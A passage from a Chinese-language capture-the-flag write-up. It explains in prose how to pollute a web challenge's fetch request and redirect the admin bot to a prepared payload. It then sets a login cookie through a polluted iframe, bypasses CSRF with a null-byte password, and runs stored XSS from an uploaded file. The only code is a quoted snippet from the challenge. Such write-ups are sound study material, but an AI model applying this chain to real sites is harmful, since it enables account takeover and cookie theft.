</span></span></code></pre></div><p><code>bot</code>的<code>cookie</code>域只在后端域名，所以我们需要在后端中找到一个点，可以跳转到我们准备好的执行上面一系列的html中。在<code>index.js</code>中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">q</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">q</span>.<span style="color:#a6e22e">message</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">welcome</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/isLoggedIn&#34;</span>, { <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span> })).<span style="color:#a6e22e">json</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">welcome</span>.<span style="color:#a6e22e">path</span>) {
</span></span><span style="display:flex;"><span>	window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">welcome</span>.<span style="color:#a6e22e">path</span>
</span></span></code></pre></div><p>上面的<code>parseParams</code>跟前端的一样，不再赘述，这里需要污染fetch的请求方法，使返回空，因为后端只定义了<code>GET</code>，所以定义为POST即可，然后跳转到我们准备好的payload中，就开始污染<code>&lt;iframe&gt;</code>的<code>srcdoc</code>设置<code>/login</code>的<code>cookie</code>，然后<code>/login</code>上传注册好的含<code>null byte</code>的用户密码和<code>_csrf</code>绕过<code>csrf</code>限制，登录成功获得set-Cookie，访问我们之前上传的含<code>XSS``payload</code>的<code>txt</code>文件，将其后缀名改为<code>html</code>后执行<code>XSS</code></p>
<p>太难了这题，没有自己的想法，等强点再回来看看</p>

        </article>
    </div>
    <div class="giscus_comments"><script src="https://giscus.app/client.js"
        data-repo="an5er/an5er.github.io"
        data-repo-id="R_kgDOKnQBrQ"
        data-category="Announcements"
        data-category-id="DIC_kwDOKnQBrc4Cav6q"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="dark"
        data-lang="zh-CN"
        crossorigin="anonymous"
        async>
</script>
    </div>
    

            </div>
        </div><footer class="text-center pb-1">
</footer>
</body>
</html>
